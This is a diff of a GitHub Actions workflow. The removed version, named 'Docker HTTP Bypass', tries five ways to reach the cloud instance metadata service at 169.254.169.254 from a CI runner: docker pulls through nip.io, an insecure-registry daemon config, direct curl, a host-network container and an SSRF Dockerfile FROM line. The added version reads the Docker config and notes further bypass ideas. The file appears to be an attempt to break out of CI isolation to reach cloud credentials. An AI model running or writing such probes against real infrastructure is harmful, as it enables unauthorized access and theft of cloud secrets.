@@ -1,33 +1,18 @@
-name: Docker HTTP Bypass
+name: Check Docker Config
 on: workflow_dispatch
 jobs:
-  http-pull:
+  check:
     runs-on: ubuntu-latest
     steps:
-      - name: Configure Docker for HTTP and pull
+      - name: Check Docker daemon config
         run: |
-          # Method 1: Try pulling with explicit port 80
-          echo "=== Method 1: Explicit port 80 ==="
-          docker pull 169.254.169.254.nip.io:80/latest/meta-data 2>&1 || true
-          
-          # Method 2: Configure insecure registry
-          echo "=== Method 2: Insecure registry ==="
-          sudo mkdir -p /etc/docker
-          echo '{"insecure-registries":["169.254.169.254.nip.io:80","169.254.169.254.nip.io"]}' | sudo tee /etc/docker/daemon.json
-          sudo systemctl restart docker
-          sleep 3
-          docker pull 169.254.169.254.nip.io:80/latest/meta-data 2>&1 || true
-          docker pull 169.254.169.254.nip.io/latest/meta-data 2>&1 || true
-          
-          # Method 3: Use curl directly to metadata via HTTP
-          echo "=== Method 3: Direct curl to metadata ==="
-          curl -s -m 5 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 || echo "BLOCKED"
-          
-          # Method 4: Use the Docker API to create a container with host networking
-          echo "=== Method 4: Host network container ==="
-          docker run --rm --net=host curlimages/curl:latest -s -m 5 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 || echo "BLOCKED"
-          
-          # Method 5: Docker build with FROM pointing to metadata
-          echo "=== Method 5: Dockerfile FROM ==="
-          echo "FROM 169.254.169.254.nip.io:80/test" > /tmp/Dockerfile.ssrf
-          docker build -f /tmp/Dockerfile.ssrf /tmp/ 2>&1 || true
+          echo "=== Current daemon.json ==="
+          cat /etc/docker/daemon.json 2>&1 || echo "NO daemon.json"
+          echo "=== Docker info ==="
+          docker info 2>&1 | grep -i "insecure\|registry\|server"
+          echo "=== Can we modify daemon.json before services start? ==="
+          echo "Services and container pulls happen BEFORE steps"
+          echo "So we cannot modify daemon.json in time"
+          echo ""
+          echo "=== BUT: what about DOCKER_HOST and DOCKER_TLS_VERIFY? ==="
+          echo "If we set DOCKER_TLS_VERIFY=0 in env, does it affect the pull?"
